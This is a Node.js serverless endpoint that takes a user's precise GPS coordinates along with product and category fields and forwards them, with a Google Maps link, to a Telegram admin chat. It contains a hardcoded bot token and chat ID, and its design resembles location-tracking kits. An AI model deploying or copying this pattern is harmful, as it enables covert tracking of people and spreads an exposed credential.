const axios = require('axios');

const BOT_TOKEN = '8590293720:AAEAq7FYlab9FGCZ1s6I6w8jEiX56wDtzNQ';
const ADMIN_CHAT_ID = '7506412328';

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { latitude, longitude, accuracy, produk, kategori } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({ error: 'latitude and longitude required' });
        }

        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

        const message = `
📍 *LOKASI USER*

📱 Produk: ${produk || '-'}
🏷️ Kategori: ${kategori || '-'}
📍 Latitude: ${latitude}
📍 Longitude: ${longitude}
🎯 Akurasi: ${accuracy || '-'} meter

🗺️ [Lihat di Google Maps](${googleMapsLink})
        `;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });

        console.log('✅ Location sent to admin');

        res.status(200).json({ 
            success: true, 
            message: 'Location sent',
            maps_link: googleMapsLink
        });

    } catch (error) {
        console.error('❌ Send location error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
};
